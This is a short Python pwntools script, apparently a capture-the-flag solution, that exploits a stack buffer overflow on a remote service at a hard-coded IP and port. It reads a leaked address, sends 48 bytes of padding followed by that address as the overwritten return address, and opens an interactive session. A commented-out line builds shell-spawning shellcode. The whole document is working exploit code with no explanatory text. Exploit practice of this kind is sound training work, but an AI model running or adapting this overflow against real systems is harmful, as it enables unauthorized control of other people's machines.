from pwn import *
context.log_level="debug"

p = remote("3.238.30.178", 3001)
p.recvuntil("address: 0x")
ret = int(p.recv(8).ljust(8, b"\x00")[:-1],16)
info(str(hex(ret)))
# shell=asm(shellcraft.sh())
p.sendlineafter(": ",b"A"*(48)+p64(ret))
p.interactive() 

